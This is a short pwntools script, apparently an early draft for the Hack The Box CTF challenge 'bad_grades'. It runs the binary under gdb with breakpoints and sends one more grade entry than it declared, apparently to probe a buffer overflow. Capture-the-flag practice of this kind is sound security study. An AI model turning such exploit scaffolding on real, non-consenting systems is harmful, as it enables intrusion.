from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./bad_grades")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/CTF/htb/bad_grades/libc.so.6"}

#p = remote("1.2.3.4", 30246)
#p = process("./restaurant")
p = gdb.debug("./bad_grades", '''
break *0x00400fd5
break *0x00401184
break *0x004010e7
''')

payload = ""
payload += "9" * 4

# 2. Add New.
p.recv()
p.sendline("2")

# Number of Grades:
p.recv()
p.sendline("100")

for i in range(100):
    p.sendline(payload)




p.sendline(payload)
p.interactive()
